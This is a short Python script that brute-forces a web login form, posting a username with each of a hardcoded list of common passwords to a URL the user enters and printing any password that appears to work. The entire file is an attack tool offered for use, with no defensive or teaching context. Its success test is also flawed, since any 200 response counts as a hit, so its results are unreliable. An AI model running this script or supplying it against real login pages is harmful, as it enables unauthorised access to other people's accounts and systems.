import requests

def brute_force_login(url, username, passwords):
    for password in passwords:
        print(f"Trying password: {password}")
        response = requests.post(url, data={"username": username, "password": password})
        if "Welcome" in response.text or response.status_code == 200:
            print(f"[+] Password found: {password}")
            return password
    print("[-] Password not found.")
    return None

if __name__ == "__main__":
    url = input("Enter login URL: ")
    username = input("Enter username: ")
    passwords = ["123456", "password", "admin", "admin123"]
    brute_force_login(url, username, passwords)